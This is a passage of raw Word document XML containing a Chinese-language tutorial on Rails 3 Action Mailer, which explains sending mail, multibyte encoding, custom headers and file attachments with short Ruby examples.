              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "new"</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FCE9FF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format.json { render :json</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @user.errors, :status</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :unprocessable_entity</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34DC980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0DC247B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7145661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0E6B0FF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7884A2B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这样就轻松地实现了目标，不需要观察者之类的东西。 方法 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>welcome_email</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 返回一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Mail::Message</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象，它会像 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>deliver</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 请求把它自己发送出去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1364846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在过去几个版本里的 Rails ，你需要调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>deliver_welcome_email</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create_welcome_email</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。它们在 Rails 3.0 中被弃用了，你只需要调用这个方法名本身即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123754F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发送一封邮件可能需要花费将近一秒的时间，如果你需要一次性发送好几封邮件，或者你不想因此降低主机的处理俗入，你恐怕要考虑下使用一个后台处理软件，例如 Delayed　Job.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC3EF8E"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2.2 多字节问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACA1AA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Action Mailer 已经解决了文中的多字节编码问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466CC96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如果你用　UTF-8　作为你的字符集，你什么都不用做，直接用　UTF-8　编码填写邮件地址，主题，关键词，文件名和邮件正文，如果邮件头部或 者正文中出现了非　US-ASCII　编码部分， Action Mailer 会自动把他们转码为可读的版本（quoted printable）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5676C39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关于更为复杂的编码问题，例如在正文中编写了多种字符集，请参考　Ｍａｉｌ　类库。　</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25395B08"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2.3 Action Mailer 方法全列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2466151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其实不管你发什么邮件都只需要三个方法就够了：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B436B91" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="260"/>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headers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 指定你邮件的头部，你可以传入一个哈希来把头部作为数据的键值对，然后你就可以这么用 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>headers[:field_name] = ‘value’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64828891" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="260"/>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attachments</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 允许你添加附件到你的　ｅｍａｉｌ　中　例如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attachments[‘file-name.jpg’] = File.read(‘file-name.jpg’)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EBE1C48" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="260"/>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mail</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 发送邮件。你可以把头部数据以哈希的形式传入， mail　将会根据你的模板生成　Ｅｍａｉｌ　.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4FEECA"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2.3.1 自定义头部部分</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B88A64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自定义头部很简单，你只需要用三步就能够完成：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0460DFE6" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="261"/>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把头部作为一个参数传入　</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>mail</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法: 　 </w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblInd w:w="720" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2760"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4E5F1BF2" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="137A1AB4" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1299654118"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>mail("X-Spam"</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; value)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="31BFE15D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="262"/>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传递一个键值对参数到　</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>headers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">　方法:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3000"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="06800E08" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="29358D72" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1469667256"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>headers["X-Spam"] = value</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79A7048C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="263"/>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传递一个哈希到　</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>headers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">　方法:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6840"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4D5E25FA" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17665F2E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1531331679"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>headers {"X-Spam"</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; value, "X-Special"</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; another_value}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2FE3BF7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所有的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>X-Value</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 头部　每 RFC2822 可以出现多次. 如果你想要删除一个　</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>X-Value</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">　头，你需要将其值声明成　</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F35E5D1"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2.3.2 添加附件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61BE60B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添加附件在　Action Mailer 3.0　中得到了大大的简化.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F91F605" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="264"/>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只要传入　文件名的内容之后 Action Mailer 和 Mail 插件将会自动对其　mime_type　进行检测，并对应进行编码和创建附件.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7680"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4BB6C62D" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D9802F7" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="347951180"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>attachments['filename.jpg'] = File.read('/path/to/filename.jpg')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3DDD7D5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Mail 插件将会自动地将附件进行　Base64　编码, 如果你对这一特性不太满意，你可以将其事先编码之后把内容和编码形式用哈希一并传入　</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>attachments</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="751E805E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="265"/>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传入文件名和特殊的头部内容，为　Action Mailer 和 Mail　进行设置.</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722DA0A6" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E2F897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encoded_content = SpecialEncode(File.read('/path/to/filename.jpg'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70B962A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attachments['filename.jpg'] = {:mime_type</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'application/x-gzip',</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="130BC63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:encoding</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'SpecialEncoding',</w:t>
            </w:r>
          </w:p>
